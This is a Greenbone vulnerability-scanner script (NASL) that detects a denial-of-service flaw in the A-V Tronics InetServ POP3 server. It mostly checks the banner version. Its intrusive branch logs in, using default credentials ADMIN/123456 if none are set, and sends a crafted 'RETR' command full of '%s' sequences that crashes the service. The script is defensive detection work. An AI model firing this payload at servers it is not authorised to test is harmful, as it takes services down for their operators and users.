# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800195");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-01-27 07:47:27 +0100 (Thu, 27 Jan 2011)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("A-V Tronics InetServ POP3 Denial Of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("popserver_detect.nasl", "logins.nasl");
  script_require_ports("Services/pop3", 110, 995);
  script_mandatory_keys("pop3/avtronics/inetserv/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16038/");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to crash the
  service.");

  script_tag(name:"affected", value:"Inetserv POP3 version 3.23. Other versions may also be affected.");

  script_tag(name:"insight", value:"The flaw is due to the way server handles certain specially
  crafted commands which allows remote attackers to cause a denial of service condition.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"A-V Tronics InetServ POP3 Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("pop3_func.inc");
include("version_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

pop3Port = pop3_get_port(default:110);
banner = pop3_get_banner(port:pop3Port);
if(!banner || "POP3 on InetServer" >!< banner){
  exit(0);
}

if(safe_checks()) {
  version = eregmatch(pattern:"POP3 on InetServer \(([0-9.]+)\)", string: banner);
  if(!isnull(version[1])) {
    if(version_is_equal(version:version[1],test_version:"3.2.3")) {
      report = report_fixed_ver(installed_version:version[1], fixed_version:"None");
      security_message(port:pop3Port);
      exit(0);
    }
    exit(99);
  }
  exit(0);
}

## Intrusive Test, which will crash the vulnerable service

kb_creds = pop3_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

## Consider default username and password,
## If User and Password not given in the preference
if (!user || !pass){
  user = "ADMIN";
  pass = "123456";
}

soc1 = open_sock_tcp(pop3Port);
if(!soc1){
  exit(0);
}

res = recv_line(socket:soc1, length:1024);
if(!res || "POP3 on InetServer" >!< res){
  close(soc1);
  exit(0);
}

user_cmd = string("USER ", user);
pass_cmd = string("PASS ", pass);

send(socket:soc1, data:string(user_cmd, "\r\n"));
res = recv_line(socket:soc1, length:1024);

if("+OK user accepted" >< res)
{
  send(socket:soc1, data:string(pass_cmd, "\r\n"));
  res = recv_line(socket:soc1, length:1024);

  if("+OK welcome" >< res)
  {
    crafted_cmd = "RETR " + crap(data:string("%s"), length:70);
    send(socket:soc1, data:string(crafted_cmd, "\r\n"));
    res = recv_line(socket:soc1, length:1024);
    close(soc1);

    soc2 = open_sock_tcp(pop3Port);
    if(!soc2){
      security_message(port:pop3Port);
      exit(0);
    }

    res = recv_line(socket:soc2, length:1024);
    if(!res || "POP3 on InetServer" >!< res)
    {
      security_message(port:pop3Port);
      close(soc2);
      exit(0);
    }
    close(soc2);
  }
}
close(soc1);
